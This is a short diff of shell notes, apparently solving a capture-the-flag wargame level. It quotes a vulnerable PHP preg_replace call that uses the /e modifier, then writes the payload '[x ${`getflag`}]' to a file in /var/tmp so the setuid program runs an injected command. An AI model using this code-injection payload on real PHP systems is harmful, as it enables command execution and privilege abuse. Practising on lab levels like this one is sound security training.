@@ -1,0 +1,9 @@
+ls -al
+cat level06.php
+    -> $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
+
+./level06 level06.php
+find / -writable 2>/dev/null
+    -> /var/tmp
+echo '[x ${`getflag`}]' > /var/tmp/solution.php
+./level06 /var/tmp/solution.php
